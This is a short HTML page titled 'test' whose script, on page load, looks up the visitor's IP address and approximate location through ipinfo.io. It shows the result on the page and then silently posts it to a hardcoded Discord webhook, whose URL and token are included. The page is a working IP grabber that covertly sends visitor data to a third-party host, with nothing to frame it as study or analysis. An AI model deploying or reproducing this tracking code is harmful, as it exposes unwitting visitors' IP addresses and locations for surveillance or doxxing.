<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>test</title>
</head>
<body>

<p id="currentLocation">Fetching location...</p>

<script>
   
    fetch('https://ipinfo.io/json')
        .then(response => response.json())
        .then(data => {
            
            var city = data.city;
            var region = data.region;
            var country = data.country;
            var street = data.street; 
            var ip = data.ip; 

            
            var locationDetails = `IP: ${ip}, Location: ${city}, ${region}, ${country}.`;

            
            if (street) {
                locationDetails += ` Street: ${street}`;
            }

            document.getElementById("currentLocation").innerHTML = locationDetails;

            
            sendToDiscordWebhook(locationDetails);
        })
        .catch(error => {
            console.error('Error fetching location:', error);
            document.getElementById("currentLocation").innerHTML = "Error fetching location.";
        });

    
    function sendToDiscordWebhook(message) {
        
        const webhookUrl = 'https://discord.com/api/webhooks/1176553980223041556/GnQcvLQUmAkaBWuhUeoH8BAE3R7XDm389C44AxDeVSTgoQXUCy2YI-k6FTKCIAO-OR2o';

        fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                content: message,
            }),
        })
        .then(response => {
            if (!response.ok) {
                console.error('Failed to send message to Discord webhook:', response.status, response.statusText);
            }
        })
        .catch(error => {
            console.error('Error sending message to Discord webhook:', error);
        });
    }
</script>

</body>
</html>
